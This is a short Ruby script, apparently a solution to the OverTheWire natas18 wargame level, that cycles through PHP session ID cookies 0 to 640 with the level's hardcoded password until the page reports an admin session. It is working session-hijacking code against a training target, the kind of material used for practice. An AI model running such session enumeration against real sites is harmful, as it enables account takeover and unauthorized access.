require 'net/http'

print "Attempting: "
641.times do |i|
  print "#{i},"
  uri = URI.parse("http://natas18.natas.labs.overthewire.org/index.php")
  http = Net::HTTP.new(uri.host,uri.port)

  header = { 'Cookie' => "PHPSESSID=#{i}" }
  req = Net::HTTP::Post.new(uri.path, header)
  req.basic_auth("natas18","xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")

  resp = http.request(req)
  if resp.body.include?("You are an admin")
    puts resp.body
    break
  end
end
